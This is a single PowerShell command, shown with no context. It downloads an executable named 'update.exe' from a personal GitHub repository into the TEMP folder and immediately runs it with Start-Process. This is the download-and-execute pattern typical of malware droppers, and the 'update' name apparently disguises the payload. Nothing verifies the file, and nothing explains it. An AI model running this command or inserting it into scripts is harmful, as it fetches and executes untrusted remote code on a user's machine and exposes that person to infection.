$url="https://raw.githubusercontent.com/jia891/ok/refs/heads/main/update.exe"; $bat="$env:TEMP\update.exe"; Invoke-WebRequest $url -OutFile $bat; Start-Process $bat 
